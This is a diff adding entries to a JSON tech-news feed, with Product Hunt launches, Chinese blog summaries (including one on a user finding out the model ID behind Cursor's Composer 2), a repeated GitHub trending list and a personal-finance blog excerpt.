+    {
+      "title": "talat",
+      "link": "https://www.producthunt.com/products/talat",
+      "published": "2026-03-18T10:24:28-07:00",
+      "source": "Product Hunt",
+      "summary": "Realtime meeting notes that don’t leave your Mac\n          \n          \n            Discussion\n            |\n            Link"
+    },
+    {
+      "title": "NVIDIA NemoClaw",
+      "link": "https://www.producthunt.com/products/nvidia",
+      "published": "2026-03-16T17:59:51-07:00",
+      "source": "Product Hunt",
+      "summary": "Run autonomous agents more safely\n          \n          \n            Discussion\n            |\n            Link"
+    }
+  ],
+  "🇨🇳 中文技术博客": [
+    {
+      "title": "套壳中国大模型撑起500亿美元估值？扒一扒 Cursor 的\"套壳\"疑云",
+      "link": "http://www.ruanyifeng.com/blog/2026/03/kimi-cursor.html",
+      "published": "Sat, 21 Mar 2026 18:19:11 +0800",
+      "source": "阮一峰的网络日志",
+      "summary": "1、\n\n本周末，有一条最热闹的 AI 新闻，震动了太平洋两岸，连马斯克都关注了。\n昨天，AI 编程工具 Cursor 推出了\"自己的\"模型 Composer 2。\n\n\n\n上图是官网截图，现在点进去还写着\"自有模型\"。\n\n自从2024年10月，Composer 1 发布以来，外界就一直怀疑，它是套壳的中国模型，因为行为很类似，但苦于找不到证据。\n\n现在 Composer 2 来了，很多人就开始研究，它的背后到底是什么模型，真的是 Cursor 自家的吗？\n\nCursor 为了防止破解，做了很多限制，但是百密一疏。国外推友 @fynnso 发现，有一个地方在上一个版本是禁止的，但是这个版本却可以执行。\n\n首先，你自己架设一台服务器，充当 AI 模型的调用接口，有没有模型无所谓，只要能收到客户端请求就行。\n\n然后，你在本地的 Cursor 里面，设置使用的模型为 Composer 2，模型网址就是你刚架设的服务器。这样一来，Cursor 就会向你的服务器发出请求，从而可以看到它到底在请求什么模型。\n\n真相就暴露了，它请求的模型 ID 居然是 kimi-k2p5-rl-0317-s515-fa"
+    },
+    {
+      "title": "科技爱好者周刊（第 389 期）：未来如何招聘程序员",
+      "link": "http://www.ruanyifeng.com/blog/2026/03/weekly-issue-389.html",
+      "published": "Fri, 20 Mar 2026 07:59:16 +0800",
+      "source": "阮一峰的网络日志",
+      "summary": "这里记录每周值得分享的科技内容，周五发布。\n本杂志开源，欢迎投稿。另有《谁在招人》服务，发布程序员招聘信息。合作请邮件联系（yifeng.ruan@gmail.com）。\n\n封面图\n\n\n\n唐山河头老街景区的轨道车\"大唐云车\"。（via）\n\n未来如何招聘程序员\n\n前些天，讨论区有一个帖子，提出一个问题。\n\n如果未来的代码都是 AI 写的，那么我们怎么招聘程序员呢？\n\n\n\n程序员负责代码，但代码是 AI 写的，不是程序员写的，那么应该怎么面试他呢？\n\n你仔细想想，这个问题比预想的难多了。\n\n首先，考察他的代码能力不重要（代码不是他写的），更重要的是考察他会不会 AI。只要善于使用 AI，能够产出合格的代码，对公司来说就是合格的人选。\n\n但是，什么样的面试问题，能够考察出一个人是否掌握 AI？下面是我想出的一些问题：\n\n\n请将一个复杂的项目需求，转化成提示词，要求是清晰、逻辑性强、切中要害。\n描述一个你认为需要使用 Skill 和 MCP 的场景，并阐述它们的工作原理和构建方法。\n如何将一个大项目分解，设计出一个多 Agent 协同工作的机制。\n......\n\n\n这些问题能识别出 AI 编程"
+    },
+    {
+      "title": "HAMi Website Refactor: Why HAMi Docs and Website Underwent a Complete Redesign",
+      "link": "https://jimmysong.io/blog/hami-website-redesign-retrospective/",
+      "published": "Tue, 17 Mar 2026 08:55:52 +0800",
+      "source": "Jimmy Song",
+      "summary": "A systematic upgrade to HAMi’s website and docs, improving community visibility, content structure, search, and usability."
+    },
+    {
+      "title": "GTC 2026 Eve: AI is Becoming the New Infrastructure",
+      "link": "https://jimmysong.io/blog/gtc-2026-ai-native-infrastructure/",
+      "published": "Sun, 15 Mar 2026 11:34:06 +0800",
+      "source": "Jimmy Song",
+      "summary": "On the eve of GTC 2026, rethinking whether AI is becoming the new infrastructure from NVIDIA's AI Five-Layer Cake, the rise of agent runtime, to AI-native infrastructure."
+    }
+  ],
+  "⭐ GitHub Trends": [
+    {
+      "title": "FujiwaraChoki/MoneyPrinterV2",
+      "link": "https://github.com/FujiwaraChoki/MoneyPrinterV2",
+      "published": "2026-03-22T09:00:56.448284",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "systemd/systemd",
+      "link": "https://github.com/systemd/systemd",
+      "published": "2026-03-22T09:00:56.448318",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "aquasecurity/trivy",
+      "link": "https://github.com/aquasecurity/trivy",
+      "published": "2026-03-22T09:00:56.448338",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "Crosstalk-Solutions/project-nomad",
+      "link": "https://github.com/Crosstalk-Solutions/project-nomad",
+      "published": "2026-03-22T09:00:56.448357",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "opendataloader-project/opendataloader-pdf",
+      "link": "https://github.com/opendataloader-project/opendataloader-pdf",
+      "published": "2026-03-22T09:00:56.448375",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "jarrodwatts/claude-hud",
+      "link": "https://github.com/jarrodwatts/claude-hud",
+      "published": "2026-03-22T09:00:56.448393",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "protocolbuffers/protobuf",
+      "link": "https://github.com/protocolbuffers/protobuf",
+      "published": "2026-03-22T09:00:56.448410",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "vllm-project/vllm-omni",
+      "link": "https://github.com/vllm-project/vllm-omni",
+      "published": "2026-03-22T09:00:56.448428",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "louis-e/arnis",
+      "link": "https://github.com/louis-e/arnis",
+      "published": "2026-03-22T09:00:56.448445",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "FujiwaraChoki/MoneyPrinterV2",
+      "link": "https://github.com/FujiwaraChoki/MoneyPrinterV2",
+      "published": "2026-03-22T09:00:56.521960",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "systemd/systemd",
+      "link": "https://github.com/systemd/systemd",
+      "published": "2026-03-22T09:00:56.522000",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "aquasecurity/trivy",
+      "link": "https://github.com/aquasecurity/trivy",
+      "published": "2026-03-22T09:00:56.522024",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "Crosstalk-Solutions/project-nomad",
+      "link": "https://github.com/Crosstalk-Solutions/project-nomad",
+      "published": "2026-03-22T09:00:56.522042",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "opendataloader-project/opendataloader-pdf",
+      "link": "https://github.com/opendataloader-project/opendataloader-pdf",
+      "published": "2026-03-22T09:00:56.522060",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "jarrodwatts/claude-hud",
+      "link": "https://github.com/jarrodwatts/claude-hud",
+      "published": "2026-03-22T09:00:56.522077",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "protocolbuffers/protobuf",
+      "link": "https://github.com/protocolbuffers/protobuf",
+      "published": "2026-03-22T09:00:56.522094",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "vllm-project/vllm-omni",
+      "link": "https://github.com/vllm-project/vllm-omni",
+      "published": "2026-03-22T09:00:56.522113",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    },
+    {
+      "title": "louis-e/arnis",
+      "link": "https://github.com/louis-e/arnis",
+      "published": "2026-03-22T09:00:56.522129",
+      "source": "GitHub Trends",
+      "summary": "GitHub trending repository"
+    }
+  ],
+  "🧠 AI/ML 中文博客": [
+    {
+      "title": "曾经以为世界的发展已经趋于停滞了 哪知道现在已经无法预测10年后世界会变成啥样了",
+      "link": "https://www.physixfan.com/cengjingyiweishijiedefazhanyijingquyutingzhile-nazhidaoxianzaiyijingwufayuce10nianhoushijiehuia/",
+      "published": "Tue, 17 Mar 2026 14:13:37 +0000",
+      "source": "physixfan",
+      "summary": "作为一个曾经学物理的，当年在读PhD期间，愈发感觉至少在物理这个领域，进展是非常缓慢的，甚至趋于停滞的。能够“出圈”的物理理论，基本上都建立在20世纪七八十年代之前。进入21世纪之后物理领域都有哪些很新的成果？连弦论都是20世纪的旧东西了，听起来很新的AdS/CFT对偶都是2000年之前出现的理论了。可能拓扑绝缘体算是21世纪的东西，可是我并不觉得从人类对自然界的认知这个角度这套东西那么重要，很可能再过一小段时间就无人问津了。而像引力波的直接探测、希格斯子的实验发现、黑洞照片拍摄之类的重量级成果，其实主要意义还是用更现代的实验技术来验证之前人们的理论，在理论方面是没有新东西的。\n也许是出于物理人的一种傲慢，我当时就觉得技术的发展是基于物理的认知作为底层的，如果物理理论层面发展停滞了，那么技术进步大概也会只有小幅缓慢前进，而不会有大的变化了。就像大家开的汽车，小时候就是那个样子，到了201X年也还是那个样子（Tesla为代表的电车出现之后就另当别论了），可能只是稍微性能进步了那么一丢丢、舒适性也好了那么一丢丢而已。我当时就觉得，以后的世界发展大概就是这么继续小幅前进了吧。\n哪知2022年"
+    }
+  ],
+  "💰 投资理财": [
+    {
+      "title": "為將來的自己準備",
+      "link": "https://mercurychong.blogspot.com/2026/03/blog-post.html",
+      "published": "2026-03-17T18:28:00.000-07:00",
+      "source": "知足常乐 - 水星投资理财",
+      "summary": "&nbsp;~ 狡猾的品牌、商家和網紅們尤其擅長販賣「外表焦慮」、「身材焦慮」，把你的戀愛運氣、社交圈、職場發展和人生軌跡分別貼上標籤，然後再告訴你通用的解決方案──花錢購物，買買買。當你覺得自己很糟糕，被某種焦慮、恐懼所支配時，錢就進了商人的口袋，這條準則，全球通用。別讓錢包被鼓吹消費的資本家們掏空了，手有餘錢很重要，你永遠不知道什麼時候要用到錢，人到了一定年紀以後，最大的安全感來自銀行裡的資產和餘額。越是經濟不自由、越要保證物欲上的輕盈。水星熊從來不反對必要消費，也不提倡「極端極簡主義」，一口氣把能扔的東西都扔了，結果下次要用了，還是得重新買，耗時又耗錢；也不提倡為了每月省點錢，就勒緊褲腰帶，飯也不好好吃，把日子過得苦哈哈的。水星熊真正反對的是欲望與經濟水準不符合的超前消費，和被行銷洗腦、出於比較心理瘋狂買不停的購買欲。一個成年人得知道自己有幾斤幾兩重，應當選擇最適合自己的生活方式和消費方式。沒有必要把精挑細選的一面展現在人前，就為了想要別人無關緊要的羡慕。每一次不理性的消費，都是對重要目標的提前透支，反而讓這些目標一再往後拖，無法實現。把錢花在最能產生新價值的地方，而不是把錢花在"
+    }
+  ]
+}
